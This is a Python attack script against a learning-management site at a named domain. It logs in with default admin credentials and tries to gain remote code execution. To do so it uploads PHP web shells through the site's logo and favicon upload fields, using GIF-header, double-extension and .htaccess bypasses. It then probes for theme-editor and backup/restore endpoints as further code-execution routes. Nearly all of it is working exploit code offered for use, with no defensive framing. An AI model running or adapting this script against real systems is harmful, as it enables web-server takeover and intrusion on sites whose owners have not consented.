import requests
import re
import time

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in as Admin...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login successful.")
            return True
        else:
            print("[-] Login failed.")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    try:
        r = session.get(url)
        match = re.search(r'name="_token" value="([^"]+)"', r.text)
        if match:
            return match.group(1), r.text
        return None, r.text
    except:
        return None, ""

def exploit_customization_uploads():
    """Try RCE via site customization uploads (logo, favicon, etc)"""
    print("\n[*] Exploring Admin Customization Upload Endpoints...")
    
    # Get general settings page
    csrf, page = get_csrf(f"{BASE_URL}/admin/settings/general")
    
    print(f"[*] CSRF Token: {csrf[:20]}..." if csrf else "[!] No CSRF found")
    
    # Find all file input fields
    file_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']+)["\']', page, re.IGNORECASE)
    print(f"[*] Found file input fields: {file_inputs}")
    
    # Also look for upload endpoints in the page source
    upload_actions = re.findall(r'action=["\']([^"\']*upload[^"\']*)["\']', page, re.IGNORECASE)
    print(f"[*] Found upload actions: {upload_actions}")
    
    # Try uploading PHP shell as each file type
    shell_php = b"<?php system($_GET['c']); ?>"
    shell_gif = b"GIF89a<?php system($_GET['c']); ?>"  # GIF header + PHP
    
    for field in file_inputs:
        print(f"\n[*] Testing field: {field}")
        
        strategies = [
            # Standard PHP
            (f'{field}.php', shell_php, 'image/png'),
            # GIF header bypass
            (f'{field}.gif', shell_gif, 'image/gif'),
            # Double extension
            (f'{field}.php.png', shell_php, 'image/png'),
            # .htaccess override (if we can upload to same dir)
            ('.htaccess', b'AddType application/x-httpd-php .png', 'text/plain'),
        ]
        
        for filename, content, mimetype in strategies:
            try:
                files = {field: (filename, content, mimetype)}
                data = {'_token': csrf}
                
                # Try POST to settings update endpoint
                endpoints = [
                    f"{BASE_URL}/admin/settings/general/update",
                    f"{BASE_URL}/admin/settings/general",
                    f"{BASE_URL}/admin/settings/customization/store",
                ]
                
                for endpoint in endpoints:
                    r = session.post(endpoint, files=files, data=data, allow_redirects=False)
                    if r.status_code in [200, 302]:
                        print(f"    [{filename}] -> {endpoint}: {r.status_code}")
                        
                        # Look for uploaded file path in response or Location header
                        if 'Location' in r.headers:
                            print(f"    Redirect: {r.headers['Location']}")
                        
            except Exception as e:
                print(f"    Error: {e}")
    
    return False

def exploit_theme_editor():
    """Try RCE via theme/template editor if available"""
    print("\n[*] Checking for Theme/Template Editor...")
    
    theme_endpoints = [
        "/admin/appearance",
        "/admin/themes",
        "/admin/templates",
        "/admin/settings/appearance",
        "/admin/theme-editor",
    ]
    
    for endpoint in theme_endpoints:
        r = session.get(f"{BASE_URL}{endpoint}")
        if r.status_code == 200:
            print(f"[+] Found: {endpoint}")
            
            # Look for edit links
            edit_links = re.findall(r'href=["\']([^"\']*edit[^"\']*)["\']', r.text, re.IGNORECASE)
            if edit_links:
                print(f"    Edit links: {edit_links[:5]}")
                
            # Check if we can edit files directly
            if 'textarea' in r.text.lower() and ('template' in r.text.lower() or 'blade' in r.text.lower()):
                print(f"    [!] Possible template editor found!")
                return True
                
    return False

def exploit_backup_restore():
    """Try RCE via backup/restore functionality"""
    print("\n[*] Checking Backup/Restore Features...")
    
    backup_endpoints = [
        "/admin/settings/backup",
        "/admin/backup",
        "/admin/settings/database",
    ]
    
    for endpoint in backup_endpoints:
        r = session.get(f"{BASE_URL}{endpoint}")
        if r.status_code == 200:
            print(f"[+] Found: {endpoint}")
            
            # Check for restore/import functionality
            if 'restore' in r.text.lower() or 'import' in r.text.lower():
                print(f"    [!] Restore functionality found - potential RCE vector")
                return True
                
    return False

def main():
    if not login():
        return
    
    exploit_customization_uploads()
    exploit_theme_editor()
    exploit_backup_restore()
    
    print("\n[*] Exploration complete.")

if __name__ == "__main__":
    main()
